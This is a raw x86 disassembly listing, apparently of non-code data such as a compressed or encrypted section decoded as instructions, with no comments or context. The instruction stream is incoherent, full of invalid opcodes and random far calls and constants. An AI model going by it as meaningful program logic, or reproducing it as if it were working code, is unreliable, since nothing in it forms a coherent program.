  4181f8:	ficomp DWORD PTR [ebx]
  4181fa:	push   ebp
  4181fb:	xor    ch,al
  4181fd:	test   DWORD PTR [eax+0x7aa15df2],ebx
  418203:	rol    bh,1
  418205:	cmp    al,0x6f
  418207:	int3   
  418208:	cmovb  eax,DWORD PTR [esi+0x754833f2]
  41820f:	sbb    dh,BYTE PTR ds:0xf18728c7
  418215:	aam    0x3a
  418217:	pop    es
  418218:	cs xor al,0xdc
  41821b:	fdivr  QWORD PTR ds:0xd077df88
  418221:	hlt    
  418222:	mov    edi,0xcc430501
  418227:	and    BYTE PTR [edi-0x2e4c991e],bh
  41822d:	imul   eax,DWORD PTR ds:0xad13b778,0x5e
  418234:	adc    bl,BYTE PTR [ecx]
  418236:	ins    DWORD PTR es:[edi],dx
  418237:	sar    DWORD PTR [ecx-0x5b7b1513],cl
  41823d:	ins    DWORD PTR es:[edi],dx
  41823e:	adc    bl,BYTE PTR [ebp+ebp*4-0x6ebecc70]
  418245:	xchg   esi,eax
  418246:	fcmovne st,st(4)
  418248:	imul   ebp,DWORD PTR [ecx],0x66
  41824b:	ret    
  41824c:	arpl   WORD PTR [edx],bp
  41824e:	fcom   QWORD PTR [ebx]
  418250:	sub    BYTE PTR [ecx],dl
  418252:	mov    edx,0xb418630d
  418257:	add    BYTE PTR [eax],al
  418259:	jmp    0xbe62030a
  41825e:	das    
  41825f:	cdq    
  418260:	cmp    esp,DWORD PTR [esi]
  418262:	dec    ebp
  418263:	push   ecx
  418264:	test   eax,0xacc4fedf
  418269:	xchg   BYTE PTR [ebx],ch
  41826b:	std    
  41826c:	add    ebx,DWORD PTR [edx-0x4b]
  41826f:	dec    eax
  418270:	inc    edx
  418271:	sbb    BYTE PTR [ebp-0x76],bh
  418274:	sahf   
  418275:	not    BYTE PTR [eax-0x37f4c3dd]
  41827b:	mov    BYTE PTR [esi+0x4c8da037],ah
  418281:	mov    cl,0x9
  418283:	jne    0x418263
  418285:	or     al,0x6b
  418287:	(bad)  
  418288:	not    DWORD PTR [ecx+0x7e1dc193]
  41828e:	or     ch,BYTE PTR [edi]
  418290:	add    BYTE PTR [ecx-0x14],dh
  418293:	pop    ebx
  418294:	in     eax,0xb0
  418296:	(bad)  
  418297:	hlt    
  418298:	imul   edx,DWORD PTR [edx-0x62],0xd797d31f
  41829f:	mov    ds:0x32187c46,al
  4182a4:	add    al,0x5e
  4182a6:	xchg   DWORD PTR [edi],esp
  4182a8:	adc    al,0xcc
  4182aa:	cmc    
  4182ab:	dec    ebx
  4182ac:	add    dl,BYTE PTR [ebx-0x505fa899]
  4182b2:	inc    esi
  4182b3:	ins    DWORD PTR es:[edi],dx
  4182b4:	cmc    
  4182b5:	dec    edi
  4182b6:	fxch   st(4)
  4182b8:	call   0xe482:0xace6cbc5
  4182bf:	cdq    
  4182c0:	(bad)  
  4182c1:	out    0x31,eax
  4182c3:	iret   
  4182c4:	adc    dh,BYTE PTR [esi+0x17a526cc]
  4182ca:	mov    eax,ds:0xba268adc
  4182cf:	lods   eax,DWORD PTR ds:[esi]
  4182d0:	mov    DWORD PTR [ebx+edx*8-0x3a],esp
  4182d4:	and    DWORD PTR [edx-0x2dee042e],edi
  4182da:	in     al,0x4b
  4182dc:	jp     0x418288
  4182de:	das    
  4182df:	in     eax,0xf8
  4182e1:	in     eax,dx
  4182e2:	inc    esp
  4182e3:	lock inc ecx
  4182e5:	sub    eax,0xb0385b7e
  4182ea:	iret   
  4182eb:	cmc    
  4182ec:	nop
  4182ed:	pop    ebp
  4182ee:	pop    ecx
  4182ef:	scas   al,BYTE PTR es:[edi]
  4182f0:	xor    BYTE PTR [esi],0x68
  4182f3:	sbb    BYTE PTR [edi+esi*1-0x6a3e585e],ah
  4182fa:	and    dh,BYTE PTR [eax-0x26a56e72]
  418300:	mov    ?,WORD PTR [ebp+0x3d9357ab]
  418306:	mov    WORD PTR [ebx],?
  418308:	aas    
  418309:	or     eax,0x5ca8e42f
  41830e:	jp     0x41835e
  418310:	aas    
  418311:	lds    ebp,FWORD PTR [edi]
  418313:	jle    0x4182c1
  418315:	lea    edi,[esi+0x751e2d3f]
  41831b:	mov    ebx,0x2df548bd
  418320:	rcl    DWORD PTR [eax+0x15519af9],0xa6
  418327:	mov    dl,0xfd
  418329:	adc    edi,edx
  41832b:	ret    
  41832c:	outs   dx,BYTE PTR ds:[esi]
  41832d:	hlt    
  41832e:	mov    esp,0xf243a075
  418333:	loop   0x418310
  418335:	jle    0x41831f
  418337:	test   al,0x8c
  418339:	call   0x70c3:0xf31ff532
  418340:	addr16 mov ebx,0xc7011d9b
  418346:	dec    ecx
  418347:	mov    eax,DWORD PTR [ebx+0x6fe98e15]
  41834d:	sub    ch,BYTE PTR [eax+ebx*4]
  418350:	shl    DWORD PTR [ebx-0x3ebd62db],1
  418356:	mov    es,WORD PTR [edi-0x20]
  418359:	sbb    BYTE PTR ds:0x508b937c,ah
  41835f:	jl     0x418394
  418361:	shl    BYTE PTR [ebx-0x17727c8d],0x66
  418368:	or     eax,0x991d9427
  41836d:	jnp    0x418371
  41836f:	jbe    0x418362
  418371:	and    al,0x55
  418373:	(bad)  
  418374:	out    dx,al
  418375:	lods   al,BYTE PTR ds:[esi]
  418376:	mov    al,0x2d
  418378:	push   cs
  418379:	div    BYTE PTR [edx]
  41837b:	aad    0x82
  41837d:	push   ecx
  41837e:	es or  bx,sp
  418382:	pop    ebp
  418383:	stos   DWORD PTR es:[edi],eax
  418384:	sub    BYTE PTR [ecx-0x3014fef3],0x9a
  41838b:	fst    st(6)
  41838d:	push   esi
  41838e:	stc    
  41838f:	repnz pop edx
  418391:	and    ah,dl
  418393:	dec    eax
  418394:	push   esp
  418395:	push   ebp
  418396:	lds    ecx,FWORD PTR [edi+0xa]
  418399:	mov    ebp,0x3997a247
  41839e:	mov    ebp,0x72a39d6f
  4183a3:	mov    ds:0x690eef08,eax
  4183a8:	sbb    dh,bl
  4183aa:	pop    eax
  4183ab:	cdq    
  4183ac:	mov    ebx,0x44528c9f
  4183b1:	push   edi
  4183b2:	fimul  DWORD PTR [ebx+0x22]
  4183b5:	and    DWORD PTR [ebx+0x3aacaf2e],esi
  4183bb:	loop   0x41842b
  4183bd:	inc    edi
  4183be:	ins    DWORD PTR es:[edi],dx
  4183bf:	fiadd  DWORD PTR [eax-0x4cedfd3]
  4183c5:	mov    dl,0xec
  4183c7:	push   ecx
  4183c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183c9:	hlt    
  4183ca:	ret    0x9c0d
  4183cd:	mov    cl,0x86
  4183d0:	imul   esp,DWORD PTR [ecx-0x3cd9c4b8],0xffffffd4
  4183d7:	popa   
  4183d8:	add    BYTE PTR [ebx-0x6c],dl
  4183db:	fst    DWORD PTR [eax]
  4183dd:	popa   
  4183de:	push   0x3f
  4183e0:	and    dl,cl
  4183e2:	(bad)  
  4183e3:	pop    ebp
  4183e4:	pop    ebp
  4183e5:	or     BYTE PTR [edx],dl
  4183e7:	or     edi,ecx
  4183e9:	fimul  DWORD PTR [edi+ecx*2+0x4f]
  4183ed:	test   eax,0xaea532fe
  4183f2:	dec    ebx
  4183f3:	jle    0x4183bd
  4183f5:	fs into 
  4183f7:	xchg   ecx,eax
  4183f8:	xchg   DWORD PTR [ebp+0x61],ecx
  4183fb:	aam    0x48
  4183fd:	imul   edi,DWORD PTR [ebp+0x17c71029],0x4da4f220
  418407:	mov    ds:0xe612d9ea,al
  41840c:	adc    esi,esi
  41840e:	iret   
  41840f:	ds jae 0x4183f8
  418412:	pop    ebp
  418413:	std    
  418414:	mov    eax,0xf72348e9
  418419:	iret   
  41841a:	dec    esi
  41841b:	inc    eax
  41841c:	(bad)  
  41841d:	xor    edi,DWORD PTR [esi-0x6f]
  418420:	fcmovb st,st(6)
  418422:	addr16 push es
  418424:	out    0x16,eax
  418426:	loopne 0x4183d5
  418428:	scas   eax,DWORD PTR es:[edi]
  418429:	(bad)  
  41842a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41842b:	call   0x712dd195
  418430:	iret   
  418431:	mov    eax,0xe67efafe
  418436:	add    esi,DWORD PTR [edx+0x39018c71]
  41843c:	ret    0xe178
  41843f:	mov    ch,0x3c
  418442:	mov    DWORD PTR [eax],ebp
  418444:	mov    ?,WORD PTR [esi]
  418446:	push   es
  418447:	mov    bh,0x96
  418449:	lods   al,BYTE PTR ds:[esi]
  41844a:	into   
  41844b:	mov    al,0x2
  41844d:	sbb    eax,0x3ac0e33
  418452:	inc    BYTE PTR [eax]
  418454:	mov    esi,DWORD PTR [edi+0x47]
  418457:	mov    ah,0x30
  418459:	push   0x1727b22c
  41845e:	mov    bh,BYTE PTR [edi]
  418460:	daa    
  418461:	fmul   DWORD PTR [esp+eax*4]
  418464:	das    
  418465:	and    eax,0xde37d08
  41846a:	stos   DWORD PTR es:[edi],eax
  41846b:	(bad)  [edx-0x42]
  41846e:	fld    QWORD PTR [ebp-0x6defa346]
  418474:	dec    BYTE PTR [edi+0x5d6bc09f]
  41847a:	fadd   QWORD PTR [edx+0x1d26457b]
  418480:	xchg   BYTE PTR [ebx+0x22],bl
  418483:	out    dx,al
  418484:	sub    al,0x85
  418486:	jmp    0x741a:0x12814d0e
  41848d:	ror    DWORD PTR [eax],cl
  41848f:	pop    es
  418490:	inc    edx
  418491:	cmp    eax,DWORD PTR [edx-0x6fd70600]
  418497:	fmul   QWORD PTR [ebx]
  418499:	and    bh,BYTE PTR [edi+0x6560b119]
  41849f:	cmp    eax,0x77c4de1f
  4184a4:	les    esi,FWORD PTR [ecx-0x20]
  4184a7:	out    0x6,al
  4184a9:	retf   0xd4e3
  4184ac:	jp     0x4184b8
  4184ae:	push   edi
  4184af:	push   ss
  4184b0:	xchg   esp,eax
  4184b1:	mov    ebx,esp
  4184b3:	stos   BYTE PTR es:[edi],al
  4184b4:	adc    dl,cl
  4184b6:	jecxz  0x418498
  4184b8:	inc    ebp
  4184b9:	and    eax,0xe37741cb
  4184be:	pop    edx
  4184bf:	pop    eax
  4184c0:	loopne 0x4184fa
  4184c2:	push   ebp
  4184c3:	and    al,0xe6
  4184c5:	test   al,0x3e
  4184c7:	or     edx,ecx
  4184c9:	ins    BYTE PTR es:[edi],dx
  4184ca:	mov    ch,0x34
  4184cc:	mov    edx,0x8db7eab5
  4184d1:	enter  0xeb58,0xa2
  4184d5:	jne    0x418501
  4184d7:	and    DWORD PTR [ebx-0x124363d9],ecx
  4184dd:	repnz adc DWORD PTR [eax],0xe4d48028
  4184e4:	inc    ebx
  4184e5:	loope  0x418542
  4184e7:	xchg   edi,eax
  4184e8:	cwde   
  4184e9:	xchg   esp,eax
  4184ea:	outs   dx,DWORD PTR ds:[esi]
  4184eb:	pop    esp
  4184ec:	inc    eax
  4184ed:	dec    esi
  4184ee:	push   ss
  4184ef:	and    ebx,DWORD PTR [edx]
  4184f1:	and    edi,DWORD PTR [esi]
  4184f3:	jno    0x4184cb
  4184f5:	sar    DWORD PTR [edx+ebp*4],1
  4184f8:	lods   eax,DWORD PTR ds:[esi]
  4184f9:	adc    BYTE PTR [eax+0x57],al
  4184fc:	daa    
  4184fd:	jae    0x418550
  4184ff:	dec    ebx
  418500:	or     BYTE PTR [ecx+0x2adb1ad4],bh
  418506:	dec    esi
  418507:	dec    edi
  418508:	popa   
  418509:	mov    eax,0xe637b4a5
  41850e:	stos   BYTE PTR es:[edi],al
  41850f:	push   0xffffffef
  418511:	dec    edi
  418512:	ficom  WORD PTR [edi+0x6b]
  418515:	enter  0xf9ba,0xd0
  418519:	ficomp WORD PTR [eax-0x54]
  41851c:	or     BYTE PTR [ebp+ebx*8+0x62968882],ah
  418523:	sbb    eax,0xb2121eb6
  418528:	fldcw  WORD PTR ds:0xbf934bba
  41852e:	loope  0x41852c
  418530:	icebp  
  418531:	arpl   si,si
  418533:	(bad)  
  418534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418535:	sahf   
  418536:	mov    edi,0xe0f6fe41
  41853b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41853c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41853d:	mov    ah,0x23
  41853f:	push   0x56
  418541:	xlat   BYTE PTR ds:[ebx]
  418542:	adc    al,0xfe
  418544:	pop    eax
  418545:	frstor [edx+0x7a]
  418548:	loope  0x418584
  41854a:	jo     0x4184e6
  41854c:	shl    dl,0x1
  41854f:	xchg   esi,eax
  418550:	jmp    0x418531
  418552:	add    bl,BYTE PTR [ecx]
  418554:	inc    ebp
  418555:	int    0x3b
  418557:	fs out 0x2,eax
  41855a:	push   esp
  41855b:	sbb    al,BYTE PTR [edx]
  41855d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41855e:	fst    QWORD PTR [eax+0x44]
  418561:	int    0xa
  418563:	inc    BYTE PTR [esi+0xb]
  418566:	dec    esp
  418567:	inc    ecx
  418568:	hlt    
  418569:	outs   dx,BYTE PTR ds:[esi]
  41856a:	mov    bl,0x24
  41856c:	cmp    DWORD PTR [ebp-0x355a1e9b],esi
  418572:	ret    0x801a
  418575:	cs and al,0xef
  418578:	ins    BYTE PTR es:[edi],dx
  418579:	pop    esi
  41857a:	push   esi
  41857b:	push   esp
  41857c:	ret    0x1879
  41857f:	mov    DWORD PTR [ebx],esi
  418581:	(bad)  
  418582:	shr    dh,1
  418584:	sbb    ch,BYTE PTR ds:0xd5d866ee
  41858a:	push   ebp
  41858b:	mov    cl,0xbb
  41858d:	push   edi
  41858e:	clc    
  41858f:	add    edi,ecx
  418591:	jecxz  0x4185db
  418593:	aad    0x73
  418595:	push   ds
  418596:	xchg   BYTE PTR [ecx+0x71],bl
  418599:	dec    eax
  41859a:	bound  edx,QWORD PTR [edx+ebx*1+0x4a]
  41859e:	sbb    BYTE PTR [eax],0x93
  4185a1:	mov    ebx,0x9f2b646e
  4185a6:	cld    
  4185a7:	f2xm1  
  4185a9:	test   DWORD PTR [ebx],edx
  4185ab:	pusha  
  4185ac:	or     DWORD PTR [edx+esi*2],ecx
  4185af:	sbb    edx,DWORD PTR [esi]
  4185b1:	jg     0x4185a3
  4185b3:	mov    ebx,0x448589e1
  4185b8:	adc    cl,cl
  4185ba:	push   es
  4185bb:	dec    ebx
  4185bc:	int3   
  4185bd:	mov    ?,WORD PTR [ecx]
  4185bf:	lods   al,BYTE PTR ds:[esi]
  4185c0:	pop    edi
  4185c1:	loopne 0x4185eb
  4185c3:	out    dx,eax
  4185c4:	lods   eax,DWORD PTR ds:[esi]
  4185c5:	add    eax,0x22e22cad
  4185ca:	ds pop es
  4185cc:	dec    ebp
  4185cd:	scas   al,BYTE PTR es:[edi]
  4185ce:	imul   esp,ecx,0x6d
  4185d1:	aad    0x3c
  4185d3:	jge    0x418575
  4185d5:	xor    eax,0x98bcd727
  4185da:	jl     0x4185f4
  4185dc:	mov    cl,0xce
  4185de:	cli    
  4185df:	(bad)  
  4185e0:	xchg   ebx,eax
  4185e1:	ret    
  4185e2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4185e4:	(bad)  
  4185e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185e7:	add    esi,DWORD PTR [ebx+0x89c2684]
  4185ed:	rcl    edi,0xe0
  4185f0:	sbb    DWORD PTR [ebp-0x42e73c95],0xffffffed
  4185f7:	fsub   QWORD PTR [ebp-0x7a9366b5]
  4185fd:	(bad)  
  4185ff:	jg     0x418584
  418601:	fidivr DWORD PTR [esi]
  418603:	xor    eax,0x393d4cc8
  418608:	or     DWORD PTR [edx-0x56],ebp
  41860b:	xchg   edx,eax
  41860c:	imul   ecx,DWORD PTR fs:[esi],0x7c36bef3
  418613:	fcomp  DWORD PTR [eax+0x5c]
  418616:	fwait
  418617:	pushf  
  418618:	dec    ebx
  418619:	pop    es
  41861a:	test   BYTE PTR [ebx],al
  41861c:	mov    BYTE PTR [edi-0x41eb6825],ch
  418622:	inc    ebx
  418623:	jl     0x418699
  418625:	dec    esp
  418626:	scas   al,BYTE PTR es:[edi]
  418627:	pushf  
  418628:	stc    
  418629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41862a:	das    
  41862b:	jae    0x418665
  41862d:	push   edx
  41862e:	and    DWORD PTR [edi],esp
  418630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418631:	je     0x41863d
  418633:	sbb    eax,DWORD PTR [ebx+0x1e5dd3e6]
  418639:	int    0x95
  41863b:	pop    edx
  41863c:	and    eax,0x41a4a0c2
  418641:	fwait
  418642:	stc    
  418643:	inc    ecx
  418644:	inc    ebx
  418645:	stos   DWORD PTR es:[edi],eax
  418646:	dec    ecx
  418647:	jp     0x418689
  418649:	inc    ecx
  41864a:	dec    esp
  41864b:	test   al,0x3c
  41864d:	in     al,0x5a
  41864f:	ins    DWORD PTR es:[edi],dx
  418650:	mov    ecx,0xc0a553c7
  418655:	dec    ebx
  418656:	mov    ah,cl
  418658:	pop    ecx
  418659:	loope  0x418637
  41865b:	fld    DWORD PTR [ebp-0x3d]
  41865e:	and    eax,0x778bc552
  418663:	out    0x46,al
  418665:	add    DWORD PTR [esi+0x37c8c194],eax
  41866b:	mov    dh,0x82
  41866d:	mov    al,ds:0x185e7af7
  418673:	xchg   BYTE PTR [esi-0x30],bh
  418676:	mov    al,ds:0x95a2986
  41867b:	mov    eax,DWORD PTR [edi+0x7f]
  41867e:	ror    DWORD PTR [edx+0x20],cl
  418681:	jno    0x4186de
  418683:	mov    edi,esp
  418685:	adc    ebp,DWORD PTR [edi+0x3c13968f]
  41868b:	sbb    ecx,DWORD PTR [ebp-0x1]
  41868e:	or     bh,BYTE PTR [eax]
  418690:	sub    dh,BYTE PTR [ecx+eax*8]
  418693:	add    eax,0xd516b9d4
  418698:	bound  edx,QWORD PTR [edi]
  41869a:	stc    
  41869b:	iret   
  41869c:	push   edi
  41869d:	ins    DWORD PTR es:[edi],dx
  41869e:	fstp   QWORD PTR ds:0x1a8cba05
  4186a4:	and    BYTE PTR [ecx+0x53],ah
  4186a7:	inc    esi
  4186a8:	popf   
  4186a9:	dec    eax
  4186aa:	mov    edx,0x3d29cbe6
  4186af:	call   0xa943cea4
  4186b4:	das    
  4186b5:	adc    DWORD PTR [ebp+0x3],ecx
  4186b8:	stos   BYTE PTR es:[edi],al
  4186b9:	int    0xd4
  4186bb:	popa   
  4186bc:	(bad)  
  4186bd:	out    0x69,eax
  4186bf:	pop    esi
  4186c0:	xchg   ebx,eax
  4186c1:	mov    WORD PTR [edx+0x7],?
  4186c4:	lods   al,BYTE PTR ds:[esi]
  4186c5:	sbb    eax,0xe005a771
  4186ca:	iret   
  4186cb:	stc    
  4186cc:	xchg   edi,eax
  4186cd:	xor    cl,BYTE PTR ds:0x883781c2
  4186d3:	add    eax,0xba293330
  4186d8:	dec    ebx
  4186d9:	ret    0x6265
  4186dc:	inc    eax
  4186dd:	jge    0x418734
  4186df:	adc    DWORD PTR [ebp+0x31698150],ebp
  4186e5:	jo     0x418700
  4186e7:	mov    eax,0xd1f40a7c
  4186ec:	mov    al,ds:0x562d2236
  4186f1:	retf   0x296
  4186f4:	inc    esp
  4186f5:	or     BYTE PTR [eax+0x1c],ah
  4186f8:	aad    0xa7
  4186fa:	mov    esp,0xd4089a7f
  4186ff:	xchg   ebx,eax
  418700:	imul   ecx,eax,0xc46425b0
  418706:	popf   
  418707:	jns    0x4186c9
  418709:	sub    dh,BYTE PTR cs:[edi-0x577a50d]
  418710:	data16 sub al,0x6d
  418713:	mov    ds:0xd0ab4e6,al
  418718:	xchg   edx,eax
  418719:	or     ch,ch
  41871b:	pushf  
  41871c:	cmc    
  41871d:	ds popf 
  41871f:	(bad)  
  418720:	and    al,0xf3
  418722:	mov    ebp,0x73758d18
  418727:	cs call 0xc9336d08
  41872d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41872e:	sub    eax,DWORD PTR ds:[eax-0x23]
  418732:	dec    ebx
  418733:	repz imul esi,DWORD PTR [ebx-0x6f],0xd
  418738:	(bad)  
  418739:	(bad)  [esi+0xa]
  41873c:	hlt    
  41873d:	retf   0xd328
  418740:	mov    esp,0xbe58b9c2
  418745:	stos   DWORD PTR es:[edi],eax
  418746:	idiv   BYTE PTR [ecx+0xe38227e]
  41874c:	xchg   esp,eax
  41874d:	mov    bh,0xb6
  41874f:	frstor [eax-0x56488593]
  418755:	and    eax,0x2e580465
  41875a:	sbb    al,0xa8
  41875c:	fisub  WORD PTR [ebp+eiz*4-0x3c]
  418760:	int    0x42
  418762:	lods   al,BYTE PTR ds:[esi]
  418763:	sub    bl,BYTE PTR [esi-0x5f0c6985]
  418769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41876a:	test   DWORD PTR [eax+0x46002ba1],ecx
  418770:	pop    ss
  418771:	ret    
  418772:	pusha  
  418773:	inc    edx
  418774:	lods   al,BYTE PTR cs:[esi]
  418776:	hlt    
  418777:	lock jge 0x4187e1
  41877a:	push   ds
  41877b:	jl     0x4186fe
  41877d:	fcomp  QWORD PTR [eax+0x63]
  418780:	hlt    
  418781:	clc    
  418782:	int3   
  418783:	sub    BYTE PTR [edx],0xde
  418786:	call   0x9fc4:0xe0dac9fd
  41878d:	pop    ds
  41878e:	jns    0x4187ff
  418790:	pop    es
  418791:	cmp    BYTE PTR [ebp-0xc740a0a],dl
  418797:	arpl   WORD PTR [esi-0x6753974],sp
  41879d:	cmp    ecx,DWORD PTR [ecx+0x42]
  4187a0:	sub    DWORD PTR [eax+0x5f317b11],eax
  4187a6:	and    ecx,DWORD PTR [ebp-0x79]
  4187a9:	ret    
  4187aa:	in     eax,0x46
  4187ac:	cld    
  4187ad:	and    DWORD PTR [ecx-0x424ce2cf],ebx
  4187b3:	mov    dh,0xeb
  4187b5:	stos   BYTE PTR es:[edi],al
  4187b6:	rcr    DWORD PTR [ecx+0x42],0x78
  4187ba:	add    ecx,DWORD PTR [ecx]
  4187bc:	pop    ebp
  4187bd:	loope  0x41882e
  4187bf:	ins    DWORD PTR es:[edi],dx
  4187c0:	popa   
  4187c1:	jo     0x41876e
  4187c3:	(bad)  
  4187c5:	lods   eax,DWORD PTR ds:[esi]
  4187c6:	repnz push edi
  4187c8:	hlt    
  4187c9:	and    eax,DWORD PTR [eax+0x70]
  4187cc:	in     al,0x2
  4187ce:	popa   
  4187cf:	or     eax,DWORD PTR [eax-0x52]
  4187d2:	jmp    0x41875a
  4187d4:	stos   DWORD PTR es:[edi],eax
  4187d5:	push   ebx
  4187d6:	paddsb mm1,QWORD PTR [eax-0x77]
  4187da:	mov    ebp,0xff382858
  4187df:	popa   
  4187e0:	clc    
  4187e1:	and    al,0x9
  4187e3:	push   ss
  4187e4:	fdiv   DWORD PTR [ebp+0x22]
  4187e7:	jno    0x4187cd
  4187e9:	aam    0x6b
  4187eb:	push   esi
  4187ec:	gs or  dh,cl
  4187ef:	xchg   esi,eax
  4187f0:	in     al,0xbd
  4187f2:	jno    0x4187e7
  4187f4:	push   edx
  4187f5:	mov    WORD PTR ds:0x6ead5760,ss
  4187fb:	sbb    al,0xef
  4187fd:	pushf  
  4187fe:	mov    dh,ch
  418800:	mov    edi,DWORD PTR [edi+0x5c]
  418803:	pop    DWORD PTR [ebx]
  418805:	push   ecx
  418806:	mov    ah,0xba
  418808:	lods   eax,DWORD PTR ds:[esi]
  418809:	loop   0x4187a7
  41880b:	push   edi
  41880c:	aas    
  41880d:	aas    
  41880e:	lods   eax,DWORD PTR ds:[esi]
  41880f:	icebp  
  418810:	rcl    DWORD PTR [esi],cl
  418812:	pop    ebx
  418813:	cmp    BYTE PTR [ebp+0x3d185981],dl
  418819:	mov    dl,0xac
  41881b:	or     dl,BYTE PTR [esi-0x67]
  41881e:	xchg   ebp,eax
  41881f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418820:	sub    eax,DWORD PTR [ecx-0x38]
  418823:	(bad)  
  418824:	int    0x36
  418826:	jno    0x418843
  418828:	mov    edx,0xc361b58f
  41882d:	outs   dx,DWORD PTR ds:[esi]
  41882e:	xor    eax,0xab5e2eed
  418833:	shl    BYTE PTR [esp+eiz*8-0x15],cl
  418837:	jl     0x418839
  418839:	jne    0x41883c
  41883b:	dec    edx
  41883c:	pop    ss
  41883d:	lea    esi,[eax+0x1922f291]
  418843:	fist   WORD PTR ds:0xd84475b2
  418849:	mov    al,ds:0x2aa2052c
  41884e:	add    DWORD PTR [edi+0x7f],eax
  418851:	adc    al,0x84
  418853:	ja     0x4188a9
  418855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418856:	push   dx
  418858:	loope  0x4188ab
  41885a:	cmp    ch,BYTE PTR [esi+eax*1]
  41885d:	pop    ds
  41885e:	mov    al,ds:0x7b011dfb
  418863:	cmp    DWORD PTR ds:0x3eba8a52,eax
  418869:	sahf   
  41886a:	adc    DWORD PTR [edx+0x68],esi
  41886d:	inc    edx
  41886e:	call   0xf198:0xb8151fb0
  418875:	cmp    ebp,esp
  418877:	push   ds
  418878:	ins    BYTE PTR es:[edi],dx
  418879:	(bad)  
  41887a:	loop   0x41889f
  41887c:	push   DWORD PTR [ecx]
  41887e:	aas    
  41887f:	gs aad 0xcf
  418882:	jg     0x4188fe
  418884:	(bad)  
  418885:	mov    edx,0x531d0d5d
  41888a:	xchg   edx,eax
  41888b:	repz xor al,0x81
  41888e:	mov    WORD PTR [edx],?
  418890:	popa   
  418891:	mov    bl,0xac
  418893:	fcomp  QWORD PTR [ecx+0x6efe22ad]
  418899:	jl     0x418826
  41889b:	dec    esp
  41889c:	(bad)  
  41889d:	fdivrp st(3),st
  41889f:	lods   eax,DWORD PTR ds:[esi]
  4188a0:	mov    ebp,0x1f21b23e
  4188a5:	sti    
  4188a6:	xchg   ebp,eax
  4188a7:	sar    al,cl
  4188a9:	or     bh,BYTE PTR [edx+0x3af71754]
  4188af:	retf   0xc97a
  4188b2:	nop
  4188b3:	data16 daa 
  4188b5:	and    al,0xf7
  4188b7:	and    DWORD PTR [esi-0x404440eb],edi
  4188bd:	cdq    
  4188be:	push   ebp
  4188bf:	(bad)  
  4188c0:	stos   DWORD PTR es:[edi],eax
  4188c1:	arpl   WORD PTR [ebx+0x51],ax
  4188c4:	pop    esp
  4188c5:	das    
  4188c6:	push   eax
  4188c7:	inc    esp
  4188c8:	sbb    ebx,esp
  4188ca:	adc    BYTE PTR [edi-0x15cdf9cb],bl
  4188d0:	mov    ds:0xa0976756,eax
  4188d5:	mov    ch,0xb9
  4188d7:	mov    ds:0x7d5d04c9,eax
  4188dc:	pushf  
  4188dd:	sbb    esi,eax
  4188df:	fs jmp 0x41890e
  4188e2:	lea    edi,[ebx+eiz*8+0x5aaa232f]
  4188e9:	nop
  4188ea:	add    eax,0x33fd25ae
  4188ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f0:	test   BYTE PTR ss:[ebx+0x21],al
  4188f4:	daa    
  4188f5:	jno    0x41895b
  4188f7:	sbb    DWORD PTR [esp+eax*8+0x160b9ecd],0xb
  4188ff:	mov    eax,ds:0xc45be641
  418904:	or     al,0xcc
  418906:	fwait
  418907:	cs popf 
  418909:	xchg   ecx,eax
  41890a:	mov    ds:0x39e7a08d,eax
  41890f:	xchg   edi,eax
  418910:	xor    ebx,DWORD PTR ss:[ecx-0x4e5000dd]
  418917:	dec    esi
  418918:	pop    esp
  418919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41891a:	xchg   ebx,eax
  41891b:	mov    ds:0xfe23462c,eax
  418920:	pop    eax
  418921:	mov    ecx,0x9753d7
  418926:	mov    ebx,0xc612b41
  41892b:	pop    edx
  41892c:	jp     0x41891c
  41892e:	pop    edx
  41892f:	add    eax,0x35761f19
  418934:	repnz fwait
  418936:	aaa    
  418937:	pop    eax
  418938:	xor    al,0x10
  41893a:	imul   esp,DWORD PTR [edx],0x3
  41893d:	sbb    dl,bh
  41893f:	stos   DWORD PTR es:[edi],eax
  418940:	push   ss
  418941:	mov    ch,0xf7
  418943:	cmp    DWORD PTR [esi-0x11e9113d],esp
  418949:	(bad)  
  41894a:	aas    
  41894b:	(bad)  
  41894c:	shl    DWORD PTR [ebx+0x3c0d6458],0xd9
  418953:	(bad)  
  418954:	pop    edi
  418955:	out    dx,eax
  418956:	jl     0x4189c1
  418958:	clc    
  418959:	or     edi,edx
  41895b:	rcr    BYTE PTR [ebx-0x46],cl
  41895e:	repz call ebp
  418961:	lock jo 0x4189e0
  418964:	mov    cl,0x19
  418966:	ret    
  418967:	add    eax,0x7663b019
  41896c:	pop    ds
  41896d:	dec    ebp
  41896e:	cld    
  41896f:	(bad)  
  418970:	scas   eax,DWORD PTR es:[edi]
  418971:	push   ebx
  418972:	push   ss
  418973:	test   DWORD PTR [edx-0x20],esp
  418976:	clc    
  418977:	add    al,0xe3
  418979:	mov    dl,0xfb
  41897b:	outs   dx,DWORD PTR ds:[esi]
  41897c:	mov    BYTE PTR [ebp+0x65],cl
  41897f:	in     eax,0xf9
  418981:	sbb    eax,0xbfdd93ca
  418986:	daa    
  418987:	je     0x4189b0
  418989:	cmc    
  41898a:	mov    ds:0x42535279,al
  41898f:	jno    0x418982
  418991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418992:	out    0xa,eax
  418994:	fst    DWORD PTR [eax-0xa]
  418997:	xadd   esp,esi
  41899a:	sbb    dl,BYTE PTR [ebp-0x75]
  41899d:	jnp    0x41896e
  41899f:	(bad)
  4189a2:	or     BYTE PTR [esi+eiz*8-0x59],ch
  4189a6:	push   edx
  4189a7:	ret    
  4189a8:	push   edi
  4189a9:	ja     0x4189b5
  4189ab:	adc    al,0x8f
